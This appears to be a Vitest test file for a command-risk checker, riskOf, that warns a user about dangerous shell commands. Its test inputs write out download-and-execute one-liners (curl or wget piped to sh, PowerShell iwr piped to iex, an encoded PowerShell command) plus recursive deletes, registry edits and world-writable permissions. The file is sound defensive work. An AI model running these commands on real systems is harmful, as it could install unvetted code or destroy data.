import { describe, expect, it } from "vitest";
import { riskOf } from "./index";

describe("riskOf: what to warn the owner about in a command", () => {
  it("warns about downloading something and running it at once", () => {
    for (const c of ["curl -fsSL https://x.example/install.sh | sh", "wget -qO- https://x.example/i | sudo bash", "iwr https://x.example/i.ps1 | iex", "irm https://x.example/i.ps1 | Invoke-Expression", "powershell -enc SQBFAFgA"]) {
      expect(riskOf(c).join(" "), c).toMatch(/runs it|hides/i);
    }
  });
  it("warns about administrator rights, deleting folders, the registry, wide permissions and system folders", () => {
    expect(riskOf("sudo apt install x").join(" ")).toMatch(/administrator/i);
    expect(riskOf("rm -rf ./build").join(" ")).toMatch(/deletes/i);
    expect(riskOf("Remove-Item C:/x -Recurse -Force").join(" ")).toMatch(/deletes/i);
    expect(riskOf("reg add HKLM/Software/X /v a").join(" ")).toMatch(/registry/i);
    expect(riskOf("chmod -R 777 /srv").join(" ")).toMatch(/permissions/i);
    expect(riskOf("cp tool /usr/local/bin/tool && echo hi > /etc/motd").join(" ")).toMatch(/system folders/i);
  });
  it("says nothing about the ordinary steps of a setup", () => {
    for (const c of ["npm install", "pnpm i --frozen-lockfile", "pip install -r requirements.txt", "git clone https://github.com/o/r", "ls -la", "python setup.py build", "sh ./scripts/setup.sh"]) expect(riskOf(c), c).toEqual([]);
  });
  it("lists each warning once", () => {
    expect(riskOf("sudo rm -rf a; sudo rm -rf b").length).toBe(2);
  });
});
